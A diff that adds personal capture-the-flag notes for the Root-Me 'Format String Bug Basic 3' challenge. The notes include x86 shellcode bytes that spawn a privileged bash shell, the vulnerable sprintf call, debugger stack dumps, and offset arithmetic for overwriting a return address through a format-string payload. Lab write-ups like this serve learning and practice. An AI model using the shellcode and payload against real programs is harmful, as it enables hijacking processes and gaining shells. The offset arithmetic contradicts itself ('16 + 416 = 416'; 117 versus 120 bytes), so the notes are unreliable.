@@ -1,0 +1,118 @@
+ELF x86 - Format String Bug Basic 3
+
+x86 /bin/sh:
+- This one works well with their boxes. 
+- Other shellcodes techncically work but don't give perms.
+- using python -c 'import pty;pty.spawn("/bin/bash")' didn't work.
+
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
+
+
+
+
+
+
+1. Program
+
+- takes file's stream
+- compares with username "root-me"
+- print fail or print success
+
+
+Vulnerable 
+
+sprintf (buffer, "ERR Wrong user: %400s", user);
+sprintf(outbuf, buffer);
+
+
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
+ EAX  0xffffcffc —▸ 0xf7fd853c (dl_main+8636) ◂— mov    eax, dword ptr [ebp - 0x14c]
+ EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— add    dword ptr [eax], eax
+ ECX  0x0
+ EDX  0xffffcf9c —▸ 0xf7fd4000 ◂— jg     0xf7fd4047
+ EDI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ ESI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ EBP  0xffffd208 ◂— 0x0
+ ESP  0xffffcde0 —▸ 0xffffcffc —▸ 0xf7fd853c (dl_main+8636) ◂— mov    eax, dword ptr [ebp - 0x14c]
+ EIP  0x8049261 (main+191) —▸ 0xfffe1ae8 ◂— 0x0
+──────────────────────────────────────────[ STACK ]───────────────────────────────────────────
+00:0000│ esp  0xffffcde0 —▸ 0xffffcffc —▸ 0xf7fd853c (dl_main+8636) ◂— mov    eax, dword ptr [ebp - 0x14c]
+01:0004│      0xffffcde4 —▸ 0xffffcdfc ◂— 0x20525245 ('ERR ')
+02:0008│      0xffffcde8 —▸ 0xffffcdf0 ◂— 'BBBBBBBBBB'
+03:000c│      0xffffcdec —▸ 0x80491bc (main+26) ◂— add    ebx, 0x2e44
+04:0010│      0xffffcdf0 ◂— 'BBBBBBBBBB'
+... ↓
+06:0018│      0xffffcdf8 ◂— 0x4242 /* 'BB' */
+07:001c│      0xffffcdfc ◂— 0x20525245 ('ERR ')
+────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
+
+## Return Address of 2nd sprintf(). (dl_main+8636)
+ESP  0xffffcde0 —▸ 0xffffcffc —▸ 0xf7fd853c (dl_main+8636) ◂— mov    eax, dword ptr [ebp - 0x14c]
+
+
+## ltrace; find the file pointer.
+python -c 'print "A" * 109' | ltrace ./ch17
+[...]
+fgets("AAAAAAAAAAA", 12, 0xf7fa1580) = 0xffffcdf0
+[...]
+
+## Overwrite Return Address.
+## Return Address - File Pointer = Distance Between Them
+>>> 0xffffcffc - 0xffffcdf0
+525 (bytes)
+
+
+## Successful EIP overwrite
+%105x + "B" * 4
+
+## Why doesn't it crash with; '"A" * 105 + "B" * 4' ?
+
+sprintf(outbuf, buffer) doesn't have a string format parameter. This
+allows us to insert one, allowing us to crash by inputting '%s' * 3.
+
+- the format parameter '%105x' isnt considered the same as "A" * 105.
+	user[strlen(user) - 1] = '\0' doesn't allow us to put more than 10 bytes.
+	The format paramater '%105x' allows us to place 105 whitespaces (105 boytes)
+  into buffer. (%105x)
+
+
+
+
+## Formula
+
+x = [user_input]
+distance = 524
+Constant Bytes = 416
+
+
+Objective: Find the missing number to align the file pointer to the return address.
+
+# Formula 
+
+1. Return Address - File Pointer Address     = 524 bytes
+2. Constant str. 16 bytes + 400 whitespaces  = 416 bytes 
+3. [416 bytes] - user input [9 bytes]        = 407 bytes
+4. (524)Distance - (407)string of bytes      = 117 bytes
+
+1. Distance = 524
+2. 16 + 416 = 416     // "ERR Wrong user: %400s"
+3. 416 - 9 = 407      // "%200xBBBB" takes 9 bytes
+4. 524 - 407 = 117
+4a. (524 - (16 + 400 - 9) = 117
+
+5. x = 9
+   why 9? 
+   "%200xAAAA" = 9 bytes total
+   |123456789|
+
+6. "%117x" + "B" * 4 = 0x42424242 EIP OVERFLOW
+
+outbuf   = 512
+constant = 416
+whitespace = 117
+
+return address - file pointer addres    = 524 (distance between ret & fp)
+524 - constant                          = 108 (user input: %108s)
+524 - outbuf[512]                        = 12 (distance between ret&fp - end of 512
+108 + 12                                = 120 (EIP Overflow)
